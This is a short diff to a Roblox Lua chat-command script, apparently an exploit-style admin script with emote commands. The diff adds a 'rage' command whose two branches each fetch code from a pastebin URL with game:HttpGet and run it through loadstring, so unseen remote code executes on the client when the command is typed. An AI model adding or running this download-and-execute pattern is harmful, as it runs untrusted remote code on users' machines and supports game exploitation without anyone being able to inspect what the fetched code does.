@@ -275,6 +275,12 @@ local function main_cmds(msg,plr)
                     function Stop() Lay:Stop() Lean:Stop() Dance1:Stop() Dance2:Stop() Greet:Stop() Praying:Stop() end
                     Praying:play()
                 end
+	    elseif cmd[1] == Prefix.."rage" then
+                if cmd[2] == "." then
+                    loadstring(game:HttpGet("https://pastebin.com/raw/cfQz4sb0"))()
+                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
+                    loadstring(game:HttpGet("https://pastebin.com/raw/cfQz4sb0"))()
+                end
             end
         end
     end
